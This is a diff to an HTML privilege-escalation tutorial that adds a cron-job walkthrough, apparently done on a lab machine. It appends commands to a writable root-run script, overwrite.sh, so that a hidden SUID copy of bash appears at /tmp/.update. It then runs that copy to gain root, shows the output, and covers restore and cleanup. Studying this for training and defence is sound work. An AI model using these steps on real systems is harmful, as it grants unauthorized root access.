@@ -318,16 +318,50 @@ root@debian:/home/user#</code></pre>
 		<section id="Seven">
 			<div class="section-header">Cron Jobs - File Permissions</div>
 	    	<div class="section-content">
-				<p>The method explained here is similar, in some ways, to the last. It relies on poorly configured sudo privileges. In order to list the current user's <strong>sudo privileges</strong> we simply run the command "sudo -l". Here is the output on our current target box:</p>
-	                <pre><code>user@debian:~$ sudo -l
-Matching Defaults entries for user on this host:
-    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
-		
-User user may run the following commands on this host:
-    (root) NOPASSWD: /usr/sbin/iftop
-    (root) NOPASSWD: /usr/bin/find
+				<p>View the contents of the standard system-wide cron file at `/etc/crontab`:</p>
+	                <pre><code>user@debian:~$ cat /etc/crontab
+SHELL=/bin/sh
+PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+* * * * * root overwrite.sh
+* * * * * root /usr/local/bin/compress.sh
 .... {truncated}</code></pre>
-			</div>			
+				<p>There is shell script, `overwrite.sh`, run every minute and as the root user. If our foothold user can write to the script, we can append a payload that will be executed on the cron schedule.</p><p>Firstly, locate the script:</p>
+				<pre><code>user@debian:~$ sudo find / -name "overwrite.sh"
+/usr/local/bin/overwrite.sh</code></pre>
+				<p>Confirm writability:</p>
+				<pre><code>user@debian:~$ test -w /usr/local/bin/overwrite.sh && echo "WRITABLE" || echo "NOT WRITABLE"
+WRITABLE</code></pre>
+				<p>Back up the existing file and maintain it's current permissions:</p>
+				<pre><code>user@debian:~$ test -r /usr/local/bin/overwrite.sh && install -m 746 /usr/local/bin/overwrite.sh /tmp/.cron_script.bak && echo "BACKUP CREATED" || echo "NO BACKUP — destructive"
+BACKUP CREATED</code></pre>
+                <p>Append payload to the script, here we are adding two shell commands to the script, one to copy the `bash` binary to the `tmp` directory, naming the new file `.update`, and the second to set the `suid` bit on the new file, so our foothold user can spawn the shell as effective UID 0:</p>
+				<pre><code>user@debian:~$ printf '\ncp /bin/bash /tmp/.update && chmod +s /tmp/.update\n' >> /usr/local/bin/overwrite.sh</code></pre>
+				<p>Verify the append:</p>
+				<pre><code>user@debian:~$ tail -1 /usr/local/bin/overwrite.sh
+cp /bin/bash /tmp/.update && chmod +s /tmp/.update</code></pre>
+				<p>Wait for cron execution. Verify the shell file landed AND `suid` is set AND the file is root owned:</p>
+				<pre><code>user@debian:~$ ls -la /tmp/.update
+-rwsr-sr-x 1 root root 926536 Aug 12 10:39 /tmp/.update</code></pre>
+				<p>Elevate:</p>
+				<pre><code>user@debian:~$ /tmp/.update -p
+.update-4.1#
+</code></pre>
+			<p>Confirm root achieved (effective UID is 0; real UID remaining as the original user is expected for SUID bash with `-p`):</p>
+			<pre><code>.update-4.1# id
+uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)</code></pre>
+			<p>Restore the original script:</p>
+			<pre><code>.update-4.1# test -f /tmp/.cron_script.bak && cp /tmp/.cron_script.bak /usr/local/bin/overwrite.sh && rm /tmp/.cron_script.bak && echo "RESTORED, BACKUP REMOVED" || echo "NO BACKUP TO RESTORE"
+RESTORED, BACKUP REMOVED</code></pre>
+			<p>Finally, remove the `suid` artifact:</p>
+			<pre><code>.update-4.1# rm /tmp/.update</code></pre>
+			</div>		
 	    </section>
 
 		<section id="Eight">
